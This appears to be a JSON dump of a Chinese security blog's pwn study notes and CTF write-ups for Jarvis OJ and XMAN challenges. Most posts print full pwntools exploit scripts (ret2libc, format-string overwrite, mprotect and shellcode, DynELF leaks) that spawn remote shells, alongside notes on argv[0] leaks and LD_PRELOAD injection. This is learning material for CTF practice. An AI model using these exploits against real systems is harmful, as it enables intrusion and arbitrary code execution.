http://osxr.org/glibc/source/csu/init-first.c 整个流程跟踪下来，可以确定system()具有与调用进程相同的环境变量 也就是说，system()环境变量自动继承 而通过exp rop等方式可以调用system() 二进制文件自身也可能调用system() 问题点3:如何更改正在运行的进程的环境变量 在程序启动前修改环境变量很简单 libc中的putenv()函数可以修改运行中进程的环境变量 但是，通过ROP调用putenv，不如直接调用system 如果存在足够的溢出空间，则可以伪造stack envp[] 如果envp[]中一个元素被修改为”LD_PRELOAD=./mylib.so” 就可以了 通过溢出修改envp 在return前(canary检查前)调用system 运行测试首先生成自定义的库 这个函数具有constructor属性，因此会在库被加载时自动执行 通过溢出使函数返回前调用system() 运行后，打开了另外一个shell 通过伪造环境变量成功执行了mylib.so 总结这种方式的条件非常严格： 远程shell类型(没有suid/sgid) 可以在远程环境设置任意文件 存在足够的溢出空间 栈溢出后，返回之前调用system() 可以向固定地址区域写入任意数据 当然，遇到了的话就直接用以上知识解决吧","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"RC4简单学习","slug":"RC4简单学习","date":"2019-06-12T03:07:40.000Z","updated":"2019-06-12T03:08:16.369Z","comments":true,"path":"2019/06/12/RC4简单学习/","link":"","permalink":"https://darkwing.moe/2019/06/12/RC4%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"简介 很常见的流密码 现实世界被认为是弱加密方式 但事实上，并没发现任何明确的漏洞 Bit-flip-attack这种，原理上没什么用的攻击 针对与RC4结合使用的协议特征的攻击 除此之外，”概率性确定密钥比特位”的攻击 https://en.wikipedia.org/wiki/RC4 需要很多密文进行分析 如果密文量不足，RC4仍然不切实际(短时间内)不可解读 常规CTF问题，量及时间都很困难 因此，RC4题目还能在CTF中存活 RC4算法由两个元素组成 KSA(Key-scheduling algorithm 密钥调度算法) 从key创建表的过程 PRGA(Pseudo-random generation algorithm 伪随机生成算法) 在更新表时生成伪随机数序列的过程 实际使用时，经常结合IV(Initialization Vector 初始化向量)使用 这用于防止相同的明文在使用相同的密钥加密时产生相同的密文(类似linux密码中的salt) 类似的，在解密时，从密钥生成伪随机数序列并对密文进行xor异或 1.KSA(生成表) 最终生成的S是RC4的状态表，因为只对S进行交换处理，最终将重新排列[0,1,2,…255] 2.PRGA(生成伪随机数) 最终的output是生成的随机数序列 由于密钥未在PRGA中使用（密钥已经反映在S中），如果作为RC4内部表的S泄漏，则可以识别出随后的伪随机数序列 关于RC4实现 RC4通常由KSA和PRGA实现为单独的函数 表S由KSA或PRGA使用 也就是说，它通常被定义为全局变量（= .bss） 通过argv[0] leak获取全局变量中的密码","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[]},{"title":"Pwn学习笔记19:argv[0] leak","slug":"Pwn学习笔记19-argv-0-leak","date":"2019-06-11T06:53:16.000Z","updated":"2019-06-11T06:54:17.678Z","comments":true,"path":"2019/06/11/Pwn学习笔记19-argv-0-leak/","link":"","permalink":"https://darkwing.moe/2019/06/11/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B019-argv-0-leak/","excerpt":"","text":"argv[0] leak - Stack Canary实现Stack Canary gcc编译后，stack上存在一个canary 进入函数时，canary被随机赋值 退出函数时(return前)，会检查canary是否被修改 简单测试自己写一段简单代码，产生溢出，查看结果 gcc加入了一个叫做SSP(ProPolice)的机制 溢出导致canary被修改，检测到之后产生这样的错误信息 栈的结构及溢出情况大概是这样，当产生溢出时，一定会覆盖到canary stack canary的检查机制 进入函数时，canary值从TLS区域(fs:0x28)到rax，再加载到stack上，之后清空rax 正常执行函数代码 退出函数前检查stack上canary与TLS区域的canary是否相等，检测到被修改则调用__stack_chk_fail() argv[0] leak - __stack_chk_fail()实现__stack_chk_fail()内部实现 http://osxr.org/glibc/source/debug/stack_chk_fail.c http://osxr.org/glibc/source/debug/fortify_fail.c http://osxr.org/glibc/source/sysdeps/posix/libc_fatal.c http://osxr.org/glibc/source/sysdeps/generic/paths.h __libc_argv http://osxr.org/glibc/source/csu/init-first.c __libc_init_first()是__libc_start_main() 掉哟ing的函数，也就是说，ELF启动时一定会调用 在stack上大概是这样 argv[0] leak - 运行测试能否通过溢出修改栈上的argv[0]？ 测试代码 定语一个测试字符串，确定它的地址，然后溢出写入很多这个地址 在检查canary时断点，检查状态，这时候栈上的argv[0]应该已经被修改为定义的字符串 继续运行，因为canary被修改，调用__stack_chk_fail()，错误信息显示的argv[0]也已经是定义的字符串 通过这种方式，就能够泄漏任意内存 但是，程序在此之后会结束，所以即使多次运行也只能泄漏”不变的字符串/数据” 这就是通过argv[0]进行内存泄漏的技术 假设在存在stack canary的函数中产生溢出 stack canary被检测到修改 调用__stack_chk_fail() 产生错误信息，结束 错误信息中包含__libc_argv[0] __libc_argv[0]是存在于stack上的argv[0] 这个argv[0]也可以通过溢出修改 如果有足够的溢出空间，那么就能够同时做到”canary破坏”和”argv[0]重写” 泄漏目标可以是地址固定区域的值，例如.data或者.bss flag自身(如果在内存里) 秘密信息，例如密码，密钥信息 func@GOT 根据低12比特位识别libc版本 https://qiita.com/sei0o/items/55db337b0829367a2052 补充 - xinetd与socat的默认行为差异xinetd环境下 会因为/dev/tty打开失败输出到stderr中 在xinetd中，stderr绑定到socket 因此argv[0]泄漏大体上是能成功的 socat环境下 能成功打开/dev/tty，输出到/dev/tty中 /dev/tty表示终端屏幕，因此无法连接到socket 因此，不能使用argv[0]泄漏 在本地执行的情况下，如果想要socat的行为类似于xinetd，则需要手动添加stderr,setsid选项 如果远程环境是socat，并且没有stderr,setsid，伪造环境变量LIBC_FATAL_STDERR_=1也可以","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记18:Stack细节及argv[0] leak","slug":"Pwn学习笔记18-Stack细节及argv-0-leak","date":"2019-06-05T08:09:13.000Z","updated":"2019-06-05T08:11:41.783Z","comments":true,"path":"2019/06/05/Pwn学习笔记18-Stack细节及argv-0-leak/","link":"","permalink":"https://darkwing.moe/2019/06/05/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B018-Stack%E7%BB%86%E8%8A%82%E5%8F%8Aargv-0-leak/","excerpt":"","text":"stack细节想要知道详细信息，可以写一段什么都不做的代码，例如这样： 1234$ cat test.c void main(void)&#123;&#125;$ gcc test.c -o test 编译，gdb运行，查看内存状态 main的返回地址 __libc_start_main()所使用的stack argv[ ] 实体 envp[ ] 实体 ELF Auxiliary Vectors argv[]或者envp[]之类所使用的字符串本身(一直到结尾) 最终，一个完整的stack状态如图： argv 产生错误时可能泄漏部分信息 这一点exploit时用的较多 ELF Auxiliary Vectors http://articles.manugarg.com/aboutelfauxiliaryvectors 主要是从内核传递各种值的表 极少数情况下，可以用作反调试 可以使用LD_SHOW_AUXV查看其中的值 但是ELF Auxiliary Vectors很少用于exploit vdso_base或者ld_base的leak AT_RANDOM(指向地址)，在没有到达canary路径时可用 argv[0] leak如果满足以下条件，则可能产生通用内存泄漏 存在Stack Canary保护(很常见) 利用了canary被破坏后调用的__stack_chk_fail() 如果stack上有8字节或者更多的数组，则通常会出现 没有开启PIE(Position-Independent Executables)(很常见) 也就是说，默认编译的二进制文件(高版本gcc默认启用PIE了) canary保护的函数有足够的栈溢出空间(CTF中很常见) 允许空字符的溢出问题 本地权限提升类型或者xintd类型(CVTF中很常见) 可以获取到glibc给出的错误信息 如果满足这些条件，则可以泄漏任意( 指定地址)内存 但是需要注意，leak之后进程会结束 也就是说不能用于常规ASLR环境下","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://darkwing.moe/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"61dctf fm","slug":"61dctf-fm","date":"2019-05-23T08:30:31.000Z","updated":"2019-05-23T08:31:08.040Z","comments":true,"path":"2019/05/23/61dctf-fm/","link":"","permalink":"https://darkwing.moe/2019/05/23/61dctf-fm/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9895 fm.eaef2247796c11db798a579396482399 32位elf，没开PIE，其他基本都开了： 静态分析有一个明显的格式化字符串漏洞，当x为4时会执行system(“/bin/sh”),x的值初始化3 exploit所以就要利用格式化字符串漏洞的任意地址读写，“x_addr%[i]$n”，%n可以将已经输出的字符个数写入到指定的参数中，这个格式化字符串会在栈上的某处，需要定位x_addr作为printf的第几个参数来确定[i]的值，由于x_addr在32位程序中刚好是4个字节，所以这个格式化字符串刚好能把相应参数变为4。通过gdb确定位置 可以确定是第11个参数： 那么就可以把AAAA替换为x的地址，p换成n就可以把x写成4 构造exp123456789101112131415from pwn import *elf = ELF('./fm')sh = remote('pwn2.jarvisoj.com', 9895)# sh = process('./fm')context.arch = elf.arch# context.log_level = 'debug'x_addr = 0x0804A02Cpayload = p32(x_addr) + \"%11$n\"sh.sendline(payload)sh.interactive() getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level5","slug":"XMAN-level5","date":"2019-05-21T01:48:47.000Z","updated":"2019-05-21T01:49:22.480Z","comments":true,"path":"2019/05/21/XMAN-level5/","link":"","permalink":"https://darkwing.moe/2019/05/21/XMAN-level5/","excerpt":"","text":"题目信息 mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。 nc pwn2.jarvisoj.com 9884 附件同level3_x64 那么基础信息直接使用之前的 64位elf，只开了NX，并且给出了libc文件 静态分析IDA F5，首先看elf文件，和level3一样，明显的溢出，但程序中没有直接的system和”/bin/sh” 给出的libc文件中有这两个 那么思路就和level3类似，leak之后计算地址，执行system 题目要求使用mmap和mprotect练习，假设system和execve函数被禁用，请尝试使用mmap和mprotect完成本题。 区别同样只在于32位和64位的栈上 在32位程序运行中，函数参数直接压入栈中 调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1 在64位程序运行中，参数传递需要寄存器 64位参数传递约定：前六个参数按顺序存储在寄存器rdi, rsi, rdx, rcx, r8, r9中 参数超过六个时，从第七个开始压入栈中 exploit 想要使用mprotect，且给了libc，那首选是用write函数leak出某个函数（比如write）的地址，然后由libc计算偏移得到mprotect。 把shellcode写到bss段用read可以直接搞定不多说。 由于是64位的程序，函数的前6个参数都是通过寄存器来传递的，而rwx的十进制表示是7（b111），且mprotect的函数定义是int mprotect(void *addr, size_t len, int prot);。我们的7是作为第三个参数放在rdx里，而一般是不存在有关rdx的gadgets的，所以这里我们考虑使用__libc_csu_init尾部的万能gadgets（能解决三个参数内的函数调用）。 大致流程：栈溢出 -&gt; leak write -&gt; hijack got -&gt; read shellcode from stdin to bss -&gt; call mprotect to set ‘rwx’ -&gt; exec shellcode _libc_csu_init函数是程序调用libc库用来对程序进行初始化的函数，一般先于main函数执行 构造exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394from pwn import *elf = ELF('./level5')libc = ELF('./libc-2.19.so')sh = remote('pwn2.jarvisoj.com', 9884)# sh = process('./level5')context.arch = 'amd64'# context.log_level = 'debug'write_plt = elf.plt[\"write\"]write_got = elf.got[\"write\"]read_plt = elf.plt['read']read_got = elf.got['read']vuln_func = elf.symbols[\"vulnerable_function\"]write_libc = libc.symbols[\"write\"]bss_addr = elf.bss()shellcode = asm(shellcraft.amd64.sh())pop_rdi = 0x00000000004006b3pop_rsi_r15 = 0x00000000004006b1payload1 = 'A' * 0x88payload1 += p64(pop_rsi_r15) + p64(write_got) + p64(0)payload1 += p64(pop_rdi) + p64(1)payload1 += p64(write_plt)# hijack __libc_start_main -&gt; mprotectmprotect_got = elf.got['__libc_start_main']payload1 += p64(pop_rsi_r15) + p64(mprotect_got) + p64(0)payload1 += p64(pop_rdi) + p64(0)payload1 += p64(read_plt)# read shellcode from stdin to bsspayload1 += p64(pop_rsi_r15) + p64(bss_addr) + p64(0)payload1 += p64(read_plt)# hijack __gmon_start__ -&gt; bss_shellcodebss_got = elf.got['__gmon_start__']payload1 += p64(pop_rsi_r15) + p64(bss_got) + p64(0)payload1 += p64(read_plt)payload1 += p64(elf.symbols['main'])sh.recv() # 'Input:\\n'sh.send(payload1)write_addr = u64(sh.recv(8))libc_base = write_addr - write_libclibc_mprotect = libc.symbols['mprotect']mprotect_addr = libc_base + libc_mprotectpause()sh.send(p64(mprotect_addr))pause()sh.send(shellcode)pause()sh.send(p64(bss_addr))\"\"\"0x400690 &lt;__libc_csu_init+64&gt;: mov rdx,r130x400693 &lt;__libc_csu_init+67&gt;: mov rsi,r140x400696 &lt;__libc_csu_init+70&gt;: mov edi,r15d0x400699 &lt;__libc_csu_init+73&gt;: call QWORD PTR [r12+rbx*8]0x4006a6 &lt;__libc_csu_init+86&gt;: add rsp,0x80x4006aa &lt;__libc_csu_init+90&gt;: pop rbx0x4006ab &lt;__libc_csu_init+91&gt;: pop rbp0x4006ac &lt;__libc_csu_init+92&gt;: pop r120x4006ae &lt;__libc_csu_init+94&gt;: pop r130x4006b0 &lt;__libc_csu_init+96&gt;: pop r140x4006b2 &lt;__libc_csu_init+98&gt;: pop r150x4006b4 &lt;__libc_csu_init+100&gt;: ret\"\"\"payload2 = 'A' * 0x88payload2 += p64(0x4006a6)payload2 += p64(0xdeadbeef)payload2 += p64(0) # rbxpayload2 += p64(1) # rbp# r12-&gt;addr &gt;&gt; call mprotect to set 0x600000(rw-p) to rwxp so shellcode can be executepayload2 += p64(elf.got['__libc_start_main'])payload2 += p64(7) # r13 = rdxpayload2 += p64(0x1000) # r14 = rsipayload2 += p64(0x00600000) # edi bss:0000000000600a88payload2 += p64(0x400690)payload2 += p64(0xdeadbeef)payload2 += p64(0) # rbxpayload2 += p64(1) # rbppayload2 += p64(elf.got['__gmon_start__']) # r12-&gt;addr &gt;&gt; call shellcodepayload2 += p64(0) # r13-&gt;rdxpayload2 += p64(0) # r14-&gt;rsipayload2 += p64(0) # r15-&gt;edipayload2 += p64(0x400690)sh.recv() # 'Input:\\n'pause()sh.send(payload2)sh.interactive() 因为是call QWORD PTR [r12+rbx*8]，调用的指针，所以需要劫持GOT，不能直接使用地址 getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level4","slug":"XMAN-level4","date":"2019-05-20T03:43:36.000Z","updated":"2019-05-20T03:44:35.632Z","comments":true,"path":"2019/05/20/XMAN-level4/","link":"","permalink":"https://darkwing.moe/2019/05/20/XMAN-level4/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9880 level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0 32位elf，开了Partial RELRO和NX： 静态分析 明显的溢出，没有直接可用的system，libc也未知 我们可以使用pwntools的DynELF模块来泄漏地址信息，具体参考这篇： 【技术分享】借助DynELF实现无libc的漏洞利用小结 - 安全客，安全资讯平台https://www.anquanke.com/post/id/85129 同时还有一点，因为文件本身内部没有字符串”/bin/sh”，所以我们要将它写到bss段中一边以后读取，我们在IDA中，可以看到bss段哪里开始是空的 exploit因为read有三个参数，想要read之后执行system的话需要pop3ret的gadget，使用ROPgadget查找： 构造exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *elf = ELF('./level4')sh = remote('pwn2.jarvisoj.com', 9880)# sh = process('./level4')context.arch = 'i386'# context.log_level = 'debug'bss_addr = 0x0804A024read_plt = elf.plt['read']write_plt = elf.plt['write']vuln_func = elf.symbols[\"vulnerable_function\"]pop3ret = 0x08048509def leak(address): # write(STDOUT,address,4) payload = 'A' * (0x88 + 4) payload += p32(write_plt) payload += p32(vuln_func) payload += p32(1) payload += p32(address) payload += p32(4) sh.send(payload) leak_addr = sh.recv(4) return leak_addrd = DynELF(leak, elf=ELF('./level4'))system_addr = d.lookup('system', 'libc')# read(STDIN,bss_addr,8)payload = 'A' * (0x88 + 4)payload += p32(read_plt)payload += p32(pop3ret)payload += p32(0)payload += p32(bss_addr)payload += p32(8)# system('/bin/sh')payload += p32(system_addr)payload += p32(0xdeadbeef)payload += p32(bss_addr)sh.send(payload)sh.send('/bin/sh\\x00')sh.interactive() getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level3_x64","slug":"XMAN-level3-x64","date":"2019-05-17T06:43:03.000Z","updated":"2019-05-17T06:43:34.488Z","comments":true,"path":"2019/05/17/XMAN-level3-x64/","link":"","permalink":"https://darkwing.moe/2019/05/17/XMAN-level3-x64/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9883 Hint1: 本题附件已更新，请大家重新下载以免影响解题。 level3_x64.rar.8c74c402b190ac3fbef5a9ae540c40de 64位elf，只开了NX，并且给出了libc文件 静态分析IDA F5，首先看elf文件，和level3一样，明显的溢出，但程序中没有直接的system和”/bin/sh” 给出的libc文件中有这两个 那么思路就和level3类似，leak之后计算地址，执行system 区别同样只在于32位和64位的栈上 在32位程序运行中，函数参数直接压入栈中 调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1 在64位程序运行中，参数传递需要寄存器 64位参数传递约定：前六个参数按顺序存储在寄存器rdi, rsi, rdx, rcx, r8, r9中 参数超过六个时，从第七个开始压入栈中 exploit构造exp write函数三个参数，需要rdi，rsi和rdx system函数只需要rdi即可 ROPgadget查找可用gadget： 存在pop rdi和rsi的gadget，但没有rdx 在write函数中，rdx即第三个参数为长度，第二个参数是一个内存地址，64位系统下长度为8，那么如果rdx在这个时候大于等于8的话就不需要去刻意处理 使用gdb简单调试，发现执行完read后的rdx为0x200，满足条件，那么就不需要去考虑rdx 构造exp代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *elf = ELF('./level3_x64')libc = ELF('./libc-2.19.so')sh = remote('pwn2.jarvisoj.com', 9883)# sh = process('./level3_x64')context.arch = 'amd64'# context.log_level = 'debug'write_plt = elf.plt[\"write\"]write_got = elf.got[\"write\"]vuln_func = elf.symbols[\"vulnerable_function\"]write_libc = libc.symbols[\"write\"]sys_libc = libc.symbols[\"system\"]bin_sh_libc = libc.search(\"/bin/sh\").next()pop_rdi = 0x00000000004006b3pop_rsi_r15 = 0x00000000004006b1payload1 = 'A' * 0x88# write(STDOUT,write_got,rdx)# ret = vuln_func# rdi = 1payload1 += p64(pop_rdi) + p64(1)# rsi = write_got# r15 = temppayload1 += p64(pop_rsi_r15) + p64(write_got) + p64(0xdeadbeef)payload1 += p64(write_plt) + p64(vuln_func)sh.recvline()sh.sendline(payload1)write_addr = u64(sh.recv(8))libc_base = write_addr - write_libcsys_addr = libc_base + sys_libcbin_sh_addr = libc_base + bin_sh_libcpayload2 = 'A' * 0x88# system(\"bin/sh\")# ret = vuln_func# rdi = bin_sh_addrpayload2 += p64(pop_rdi) + p64(bin_sh_addr)payload2 += p64(sys_addr) + p64(vuln_func)sh.sendline(payload2)sh.interactive() getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level3","slug":"XMAN-level3","date":"2019-05-17T05:52:09.000Z","updated":"2019-05-17T05:55:51.708Z","comments":true,"path":"2019/05/17/XMAN-level3/","link":"","permalink":"https://darkwing.moe/2019/05/17/XMAN-level3/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9879 Hint1: 本题附件已更新，请大家重新下载以免影响解题。 level3.rar.2047525b05c499c9dd189ba212bba1f8 32位elf，开了Partial RELRO和NX，并且给出了libc文件 静态分析IDA F5，首先看elf文件，明显的溢出，但程序中没有直接的system和”/bin/sh” img img 但给出的libc文件中有这两个 但因为有ASLR，libc只能获取到偏移地址，内存中真实地址未知，需要leak 这里可以利用程序本身存在的write函数，泄漏其自身地址，计算出其他所需地址 sys_addr - sys_libc == write_addr - write_libc 那么我们就可以构造溢出，首先通过write泄漏地址，之后返回到vuln函数中再次溢出执行system(“/bin/sh”) 流程大概如下，图源自网络 exploit构造exp12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *elf = ELF('./level3')libc = ELF('./libc-2.19.so')sh = remote('pwn2.jarvisoj.com', 9879)# sh = process('./level3')context.arch = 'i386'# context.log_level = 'debug'write_plt = elf.plt[\"write\"]write_got = elf.got[\"write\"]vuln_func = elf.symbols[\"vulnerable_function\"]write_libc = libc.symbols[\"write\"]sys_libc = libc.symbols[\"system\"]bin_sh_libc = libc.search(\"/bin/sh\").next()payload1 = 'A' * 0x88 + 'BBBB'# write(STDOUT,write_got,4)# ret = vuln_funcpayload1 += p32(write_plt)payload1 += p32(vuln_func)payload1 += p32(1)payload1 += p32(write_got)payload1 += p32(4)sh.recvuntil(\"Input:\\n\")sh.sendline(payload1)write_addr = u32(sh.recv(4))libc_base = write_addr - write_libcsys_addr = libc_base + sys_libcbin_sh_addr = libc_base + bin_sh_libcpayload2 = 'A' * 0x88 + 'BBBB'# system(\"bin/sh\")# ret = vuln_funcpayload2 += p32(sys_addr)payload2 += p32(vuln_func)payload2 += p32(bin_sh_addr)sh.sendline(payload2)sh.interactive() getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level2_x64","slug":"XMAN-level2-x64","date":"2019-05-16T08:42:02.000Z","updated":"2019-05-16T08:47:17.580Z","comments":true,"path":"2019/05/16/XMAN-level2-x64/","link":"","permalink":"https://darkwing.moe/2019/05/16/XMAN-level2-x64/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9882 level2_x64.04d700633c6dc26afc6a1e7e9df8c94e 64位elf，只开了NX img 静态分析IDA F5，明显溢出 img img 其他地方和level2没什么区别，只是64位和32位栈的区别 在32位程序运行中，函数参数直接压入栈中 调用函数时栈的结构为：调用函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1-&gt;···-&gt;参数1 在64位程序运行中，参数传递需要寄存器 64位参数传递约定：前六个参数按顺序存储在寄存器rdi, rsi, rdx, rcx, r8, r9中 参数超过六个时，从第七个开始压入栈中 exploit所以我们将”/bin/sh”作为system函数参数的话需要一个pop rdi的gadget，直接使用ROPGadget查找 img 之后构造exp即可 构造exp1234567891011121314151617181920from pwn import *elf = ELF('./level2_x64')sh = remote('pwn2.jarvisoj.com', 9882)# sh = process('./level2_x64')context.arch = 'i386'# context.log_level = 'debug'system_addr = elf.symbols[\"system\"]bin_sh_addr = elf.search(\"/bin/sh\").next()pop_rdi_ret = 0x00000000004006b3payload = 'A' * 0x88payload += p64(pop_rdi_ret)payload += p64(bin_sh_addr)payload += p64(system_addr)sh.sendline(payload)sh.interactive() getflag img","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level2","slug":"XMAN-level2","date":"2019-05-15T07:39:59.000Z","updated":"2019-05-15T07:40:37.978Z","comments":true,"path":"2019/05/15/XMAN-level2/","link":"","permalink":"https://darkwing.moe/2019/05/15/XMAN-level2/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9878 level2.54931449c557d0551c4fc2a10f4778a1 开了NX和Partial RELRO 静态分析IDA F5，可以看到明显的溢出，但可利用区域有限： 存在system函数及’/bin/sh’字符串，那么就可以修改返回地址为调用system(‘/bin/sh’))来getshell 流程大概如图，图源自网络 exploit构造exp12345678910111213141516171819from pwn import *elf = ELF('./level2')sh = remote('pwn2.jarvisoj.com', 9878)# sh = process('./level2')context.arch = 'i386'# context.log_level = 'debug'system_addr = elf.symbols[\"system\"]bin_sh_addr = elf.search(\"/bin/sh\").next()payload = 'A' * (0x88 + 4) # buf + old_ebppayload += p32(system_addr)payload += p32(0xdeadbeef)payload += p32(bin_sh_addr)sh.sendline(payload)sh.interactive() getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level0","slug":"XMAN-level0","date":"2019-05-15T02:14:51.000Z","updated":"2019-05-15T02:15:25.034Z","comments":true,"path":"2019/05/15/XMAN-level0/","link":"","permalink":"https://darkwing.moe/2019/05/15/XMAN-level0/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9881 level0.b9ded3801d6dd36a97468e128b81a65d 只开了NX 静态分析IDA F5，明显的溢出 在import中发现system，text中vuln上面发现内置的callsystem 那就很简单了，修改返回地址为callsystm直接getshell exploitoffset = 136 = 0x80 + 8 构造exp12345678910111213141516from pwn import *elf = ELF('./level0')sh = remote('pwn2.jarvisoj.com', 9881)# sh = process('./level0')context.arch = 'amd64'context.log_level = 'debug'callsystem = elf.symbols[\"callsystem\"]payload = 'A' * 0x88payload += p64(callsystem)sh.sendline(payload)sh.interactive() getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"XMAN level1","slug":"XMAN-level1","date":"2019-05-14T08:13:31.000Z","updated":"2019-05-14T08:14:25.421Z","comments":true,"path":"2019/05/14/XMAN-level1/","link":"","permalink":"https://darkwing.moe/2019/05/14/XMAN-level1/","excerpt":"","text":"题目信息 nc pwn2.jarvisoj.com 9877 level1.80eacdcd51aca92af7749d96efad7fb5 没开NX 静态分析IDA F5一把梭 img 流程很简单，明显的溢出，并且打印出了buf的地址 那么就可以直接将shellcode写到已知地址的buf中，并且通过溢出将返回地址修改为buf执行shellcode 简单示意图，图源自网络 img exploit img offset = 140 = 0x88 +4,因为有一个old_ebp，之后才是返回地址 构造exp12345678910111213141516171819from pwn import *elf &#x3D; ELF(&#39;.&#x2F;level1&#39;)sh &#x3D; remote(&#39;pwn2.jarvisoj.com&#39;, 9877)# sh &#x3D; process(&#39;.&#x2F;level1&#39;)context.arch &#x3D; &#39;i386&#39;context.log_level &#x3D; &#39;debug&#39;buf_addr &#x3D; sh.recv()[12:22]buf_addr &#x3D; p32(int(buf_addr, 16))shellcode &#x3D; asm(shellcraft.sh())payload &#x3D; shellcode.ljust(0x88, &#39;A&#39;)payload +&#x3D; &#39;BBBB&#39;payload +&#x3D; buf_addrsh.sendline(payload)sh.interactive() getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Tell Me Something","slug":"Tell-Me-Something","date":"2019-05-14T01:14:18.000Z","updated":"2019-05-14T01:15:11.519Z","comments":true,"path":"2019/05/14/Tell-Me-Something/","link":"","permalink":"https://darkwing.moe/2019/05/14/Tell-Me-Something/","excerpt":"","text":"题目信息 Do you have something to tell me? nc pwn.jarvisoj.com 9876 guestbook.d3d5869bd6fb04dd35b29c67426c0f05 checksec只开了NX 1234567$ checksec --file guestbook[*] &#39;&#x2F;Users&#x2F;miao&#x2F;&#x2F;CTF&#x2F;PWN&#x2F;guestbook&#x2F;guestbook&#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 静态分析直接IDA F5，可以看到一个明显的溢出，并且有一个good_game函数 good_game函数功能为读取flag 那就很明显了，通过溢出修改返回地址为good_game,读取flag exploitgdb确认信息及good_game地址 构造exp： 123456789101112131415from pwn import *elf = ELF('./guestbook')sh = remote('pwn.jarvisoj.com', 9876)# sh = process('./guestbook')context.arch = 'amd64'context.log_level = 'debug'good_game_addr = elf.symbols[\"good_game\"]payload = 'A' * 0x88payload += p64(good_game_addr)sh.sendline(payload)sh.recvline()sh.interactive() getflag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://darkwing.moe/tags/CTF/"},{"name":"Pwn","slug":"Pwn","permalink":"https://darkwing.moe/tags/Pwn/"}]},{"title":"Pwn学习笔记17:其他一些技术简介","slug":"Pwn学习笔记17-其他一些技术简介","date":"2019-05-13T02:39:04.000Z","updated":"2019-05-13T02:40:04.630Z","comments":true,"path":"2019/05/13/Pwn学习笔记17-其他一些技术简介/","link":"","permalink":"https://darkwing.moe/2019/05/13/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B017-%E5%85%B6%E4%BB%96%E4%B8%80%E4%BA%9B%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/","excerpt":"","text":"PartialOverwrite 只更改func@got低位两个字节的值，可以替换为前后0x0000~0xffff范围内的地址 修改的两个字节中，ASLR只影响高4位(低12位不受ASLR影响) 也就是说，即使不泄漏地址，也有1/16的概率调用到想要的地址 